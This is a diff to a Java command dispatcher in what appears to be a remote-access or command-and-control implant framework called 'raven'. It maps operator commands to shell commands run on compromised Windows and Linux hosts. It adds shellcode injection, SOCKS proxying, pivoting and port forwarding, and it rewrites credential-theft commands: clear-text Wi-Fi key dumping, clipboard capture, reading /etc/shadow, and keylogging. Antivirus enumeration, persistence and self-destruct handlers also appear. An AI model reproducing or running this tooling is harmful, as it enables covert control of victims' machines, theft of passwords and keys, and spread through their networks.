@@ -66,18 +66,22 @@ public final class AgentCommandDispatcher {
 
     private String Translate(String Command, String Arguments, boolean IsWindows, boolean IsLinux, Session ActiveSession) {
         return switch (Command) {
-            // ── SESSION CONTROL ────────────────────────────────────────────
+            // SESSION CONTROL
             case "exec" -> Arguments;
             case "shell" -> IsWindows ? "cmd /c " + Arguments : "sh -c " + Arguments;
             case "reconnect" -> "raven:reconnect";
             case "self-destruct" -> "raven:selfdestruct";
-            case "sleep" -> "raven:sleep " + Arguments;
-            case "jitter" -> "raven:jitter " + Arguments;
+            case "sleep" -> "raven:sleep:" + Arguments;
+            case "jitter" -> "raven:jitter:" + Arguments;
             case "ping" -> "raven:ping";
             case "screenshot" -> "raven:screenshot";
             case "spawn" -> "raven:spawn";
-            case "migrate" -> "raven:migrate " + Arguments;
-            // ── RECON — cross-platform ─────────────────────────────────────
+            case "migrate" -> Arguments.isBlank() ? null : "raven:migrate:" + Arguments;
+            case "shellcode" -> Arguments.isBlank() ? null : "raven:shellcode:" + Arguments;
+            case "portfwd" -> "raven:portfwd:" + Arguments;
+            case "socks" -> "raven:socks:" + Arguments;
+            case "pivot" -> "raven:pivot:" + Arguments;
+            // RECON — cross-platform
             case "whoami" -> IsWindows ? "whoami /all" : "whoami";
             case "hostname" -> "hostname";
             case "id" -> IsLinux ? "id" : null;
@@ -98,18 +102,22 @@ public final class AgentCommandDispatcher {
             case "domaininfo" -> IsWindows ? "net user /domain 2>&1 & whoami /groups" : null;
             case "crontab" -> IsLinux ? "crontab -l 2>/dev/null; cat /etc/cron* /etc/cron.d/* 2>/dev/null" : null;
             case "schtasks" -> IsWindows ? "schtasks /query /fo LIST /v" : null;
-            case "services" -> IsWindows ? "sc query state= all" : "systemctl list-units --type=service --state=running 2>/dev/null || service --status-all 2>/dev/null";
+            case "services" -> IsWindows ? "sc query state= all" : "bash -c 'systemctl list-units --type=service --state=running --no-pager 2>/dev/null || service --status-all 2>/dev/null || echo no service manager found'";
             case "antivirus" -> IsWindows ? "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayName 2>&1" : "ps aux | grep -iE 'clamav|sophos|eset|avast|bitdefender|trend|cylance|falcon|sentinel'";
             case "privcheck" -> IsWindows ? "whoami /priv && net localgroup administrators 2>&1" : "id; sudo -l 2>/dev/null; cat /etc/sudoers 2>/dev/null";
-            case "clipboard" -> IsWindows ? "powershell -command \"Get-Clipboard\"" : "(xclip -o 2>/dev/null || xsel --clipboard --output 2>/dev/null || wl-paste 2>/dev/null)";
-            case "keystroke" -> Arguments.equalsIgnoreCase("on") ? "raven:keylog start" : Arguments.equalsIgnoreCase("off") ? "raven:keylog stop" : null;
+            case "clipboard" -> IsWindows ? "powershell -NoProfile -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::GetText()\"" : "bash -c 'xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null || wl-paste 2>/dev/null || echo no clipboard tool available'";
+            case "keystroke" -> {
+                if (Arguments.equalsIgnoreCase("on")) yield "raven:keylog:start";
+                if (Arguments.equalsIgnoreCase("off")) yield "raven:keylog:stop";
+                yield null;
+            }
             case "searchfiles" -> IsWindows ? "where /r C:\\ " + Arguments + " 2>&1" : "find / -name \"" + Arguments + "\" 2>/dev/null";
             case "hashdump" -> IsWindows ? "raven:hashdump" : "cat /etc/shadow 2>/dev/null || unshadow /etc/passwd /etc/shadow 2>/dev/null";
             case "dumpbrowsers" -> "raven:browserdump";
-            case "wifidump" -> IsWindows ? "netsh wlan show profile name=* key=clear 2>&1" : "nmcli -s -g 802-11-wireless.ssid,802-11-wireless-security.psk connection show 2>/dev/null";
+            case "wifidump" -> IsWindows ? "powershell -NoProfile -Command \"(netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { $p=($_ -split ':')[1].Trim(); $k=(netsh wlan show profile name=$p key=clear | Select-String 'Key Content'); \\\"$p : $k\\\" }\"" : "bash -c 'which nmcli >/dev/null 2>&1 && nmcli -s -g 802-11-wireless.ssid,802-11-wireless-security.psk connection show 2>/dev/null || grep -r psk= /etc/NetworkManager/system-connections/ 2>/dev/null || echo nmcli not available'";
             case "lastlog" -> IsLinux ? "lastlog; last -n 20" : null;
             case "osquery" -> "osqueryi --line \"" + Arguments + "\"";
-            // ── FILESYSTEM ─────────────────────────────────────────────────
+            // FILESYSTEM
             case "ls" -> IsWindows ? "dir " + (Arguments.isBlank() ? "" : "\"" + Arguments + "\"") : "ls -la " + (Arguments.isBlank() ? "." : "\"" + Arguments + "\"");
             case "dir" -> IsWindows ? "dir " + (Arguments.isBlank() ? "" : "\"" + Arguments + "\"") : null;
             case "pwd" -> IsWindows ? "cd" : "pwd";
@@ -151,16 +159,17 @@ public final class AgentCommandDispatcher {
                 if (GrepParts.length < 2) yield null;
                 yield IsWindows ? "findstr /i \"" + GrepParts[0] + "\" \"" + GrepParts[1] + "\"" : "grep -n \"" + GrepParts[0] + "\" \"" + GrepParts[1] + "\"";
             }
-            case "hash" -> IsWindows ? "certutil -hashfile \"" + Arguments + "\" SHA256" : "sha256sum \"" + Arguments + "\"";
-            case "download" -> "raven:download " + Arguments;
-            case "upload" -> "raven:upload " + Arguments;
-            // ── LATERAL MOVEMENT ───────────────────────────────────────────
-            case "pivot" -> "raven:pivot " + Arguments;
-            case "portfwd" -> "raven:portfwd " + Arguments;
-            case "socks" -> "raven:socks " + Arguments;
-            case "shellcode" -> "raven:shellcode " + Arguments;
+            case "hash" -> {
+                String[] HashParts = Arguments.split("\\s+", 2);
+                String HashFile = HashParts.length > 0 ? HashParts[0] : Arguments;
+                String HashAlgo = HashParts.length > 1 ? HashParts[1].toUpperCase() : "SHA256";
+                yield IsWindows ? "certutil -hashfile \"" + HashFile + "\" " + HashAlgo : (HashAlgo.equals("MD5") ? "md5sum" : "sha256sum") + " \"" + HashFile + "\"";
+            }
+            case "download" -> "raven:download:" + Arguments;
+            case "upload" -> "raven:upload:" + Arguments;
+            // LATERAL MOVEMENT
             case "persist" -> BuildPersist(Arguments, IsWindows, IsLinux);
-            case "unpersist" -> "raven:unpersist " + Arguments;
+            case "unpersist" -> "raven:unpersist:" + Arguments;
             case "runas" -> {
                 String[] RunAsParts = Arguments.split("\\s+", 3);
                 if (RunAsParts.length < 3) yield null;
